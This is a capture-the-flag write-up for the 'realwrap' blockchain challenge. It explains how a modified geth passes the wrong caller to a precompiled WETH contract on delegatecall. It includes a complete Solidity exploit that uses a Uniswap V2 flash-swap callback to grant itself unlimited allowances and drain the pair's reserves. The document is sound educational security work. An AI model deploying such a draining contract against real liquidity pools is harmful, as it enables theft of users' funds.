## realwrap

**Authors**: [sam.ninja](https://sam.ninja)

**Tags**: blockchain

> WETH on Ethereum is too cumbersome! I'll show you what is real Wrapped ETH by utilizing precompiled contract, it works like a charm especially when exchanging ETH in a swap pair. And most important, IT IS VERY SECURE!

In this challenge there is a [UniswapV2Pair](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol) contract that allows us to swap between "precompiled" WETH and a simple ECR20 token. The goal is to drain the reserve of the Uniswap contract.

```solidity
import "./@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./UniswapV2Pair.sol";

contract SimpleToken is ERC20 {
    constructor(uint256 _initialSupply) ERC20("SimpleToken", "SPT") {
        _mint(msg.sender, _initialSupply);
    }
}

contract Factory {
    address public constant WETH = 0x0000000000000000000000000000000000004eA1;
    address public uniswapV2Pair;

    constructor() payable {
        require(msg.value == 1 ether);
        address token = address(new SimpleToken(10 ** 8 * 1 ether));
        uniswapV2Pair = createPair(WETH, token);
        IERC20(WETH).transfer(uniswapV2Pair, 1 ether);
        IERC20(token).transfer(uniswapV2Pair, 100 ether);
        IUniswapV2Pair(uniswapV2Pair).mint(msg.sender);
    }

    // [...]

    function isSolved() public view returns (bool) {
        (uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(uniswapV2Pair)
            .getReserves();
        return reserve0 == 0 && reserve1 == 0;
    }
}
```

The Uniswap contract itself is not vulnerable but they have patched `geth` to implement a WETH contract directly in the EVM. In the patch, they introduced a vulnerability in the implementation of DelegateCall.

If the Uniswap contract calls our contract, we can make a `delegatecall` to the WETH contract and the caller passed to the `Run` function will be the Uniswap contract that we want to drain.

```go
func (evm *EVM) DelegateCall(caller ContractRef, addr common.Address, input []byte, gas uint64) (ret []byte, leftOverGas uint64, err error) {
    // [...]

	// Initialise a new contract and make initialise the delegate values
	contract := NewContract(caller, AccountRef(caller.Address()), nil, gas).AsDelegate()
	// It is allowed to call precompiles, even via delegatecall
	if p, isPrecompile := evm.precompile(addr); isPrecompile {
		ret, gas, err = p.Run(evm, contract.Caller(), input, gas, evm.interpreter.readOnly)
	}
    // [...]
}
```

UniswapV2 supports [flash swaps](https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps) so we can use this to make it call a `uniswapV2Call` function in our contract. In this function, we can do a delegatecall to the `WETH.approve` to approve our contract to spend all its WETH.

We cannot do the same for the ERC20 token because it is not a precompiled contract but WETH has a function `transferAndCall` that allows us to call `token.approve` on behalf on the Uniswap contract.

Here is the exploit contract:
```solidity
pragma solidity ^0.8.17;

import "./@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./UniswapV2Pair.sol";

contract Exploit {
    address public constant WETH = 0x0000000000000000000000000000000000004eA1;
    IERC20 public constant WETH_contract = IERC20(WETH);
    IERC20 token;
    UniswapV2Pair uniswap;

    constructor(address uniswapV2Pair) {
        uniswap = UniswapV2Pair(uniswapV2Pair);
        token = IERC20(uniswap.token1());
    }

    function exploit() external payable {
        // Flash swap to make the contract call our uniswapV2Call function
        uniswap.swap(1, 0, address(this), "1");
        
        // We should now be allowed to spend all the WETH and the tokens
        require(WETH_contract.allowance(address(uniswap), address(this)) == type(uint256).max, "exploit failed for WETH");
        require(token.allowance(address(uniswap), address(this)) == type(uint256).max, "exploit failed for Token");

        // Drain the contract
        WETH_contract.transferFrom(address(uniswap), address(this), WETH_contract.balanceOf(address(uniswap)));
        token.transferFrom(address(uniswap), address(this), token.balanceOf(address(uniswap)));

        // Sync to update the reserve variables
        uniswap.sync();
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // Payback the flash swap
        WETH_contract.transfer(address(uniswap), 3);

        // Approve our contract to spend all the WETH
        (bool success, bytes memory data) = WETH.delegatecall(abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));

        // Approve our contract to spend all the tokens
        WETH.delegatecall(abi.encodeWithSignature("transferAndCall(address,uint256,bytes)", address(token), 1, abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)));
    }
}
```

